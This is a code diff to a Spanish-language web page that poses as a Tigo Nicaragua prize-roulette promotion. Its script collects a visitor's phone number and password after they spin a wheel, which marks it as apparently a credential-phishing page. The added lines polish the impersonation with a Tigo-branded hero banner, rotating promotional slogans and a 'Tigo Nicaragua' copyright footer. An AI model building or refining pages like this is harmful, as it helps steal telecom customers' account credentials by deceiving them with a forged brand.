@@ -40,6 +40,21 @@
             margin: 20px 0;
             color: #3273dc;
         }
+        .hero {
+            background-color: #3273dc;
+            color: white;
+            padding: 2rem;
+            text-align: center;
+        }
+        .hero-title {
+            font-size: 2rem;
+            font-weight: bold;
+        }
+        .footer {
+            background-color: #f5f5f5;
+            padding: 1rem;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
@@ -69,6 +84,13 @@
         </div>
     </nav>
 
+    <!-- Hero con Texto Publicitario -->
+    <section class="hero">
+        <div class="hero-body">
+            <h1 class="hero-title" id="hero-text">¡Disfruta de nuestras increíbles promociones!</h1>
+        </div>
+    </section>
+
     <!-- Cuerpo de la página -->
     <section class="section">
         <div class="container">
@@ -97,8 +119,8 @@
                 La empresa Tigo, comprometida con la población, realiza esta promoción solo con aquellos clientes que son fieles a la marca.
                 Proba suerte y ¡juga con nosotros!.
             </p>
-<br></br>
-<p class="has-text-centered"> Para ver que te has ganado, primero deten la ruleta ganadora cuando te sientas listo.Solo toca el botón de ganar y ya estas participando. Luego, deslizate en tu pantalla hacia abajo y rellena la información que se te solicita. Si quieres intentar ganar más cosas puedes seguir jugando.</p>
+            <br></br>
+            <p class="has-text-centered"> Para ver que te has ganado, primero deten la ruleta ganadora cuando te sientas listo.Solo toca el botón de ganar y ya estas participando. Luego, deslizate en tu pantalla hacia abajo y rellena la información que se te solicita. Si quieres intentar ganar más cosas puedes seguir jugando.</p>
         </div>
     </section>
 
@@ -124,6 +146,15 @@
         </div>
     </section>
 
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="content has-text-centered">
+            <p>
+                <strong>Tigo Nicaragua</strong> &copy; 2025. Todos los derechos reservados.
+            </p>
+        </div>
+    </footer>
+
     <script>
         const premios = ["Recargas", "Internet", "Teléfonos", "TV", "Termo", "Camiseta", "Gorra", "Mochila"];
         const carruselContainer = document.getElementById('carrusel-container');
@@ -133,10 +164,30 @@
         const telefonoInput = document.getElementById('telefono');
         const contrasenaInput = document.getElementById('contrasena');
         const enviarCorreoBtn = document.getElementById('enviar-correo');
+        const heroText = document.getElementById('hero-text');
 
         let intervalo;
         let desplazamiento = 0;
         let jugando = false;
+
+        // Textos publicitarios para el hero
+        const textosPublicitarios = [
+            "¡Disfruta de nuestras increíbles promociones!",
+            "Recargas con hasta 20% de descuento",
+            "Internet ilimitado por solo $10 al mes",
+            "Nuevos teléfonos con planes especiales",
+            "TV en vivo con más de 100 canales"
+        ];
+        let indiceTexto = 0;
+
+        // Función para cambiar el texto del hero
+        function cambiarTextoHero() {
+            heroText.textContent = textosPublicitarios[indiceTexto];
+            indiceTexto = (indiceTexto + 1) % textosPublicitarios.length;
+        }
+
+        // Cambiar el texto del hero cada 2 segundos
+        setInterval(cambiarTextoHero, 2000);
 
         // Función para mover el carrusel
         function moverCarrusel() {
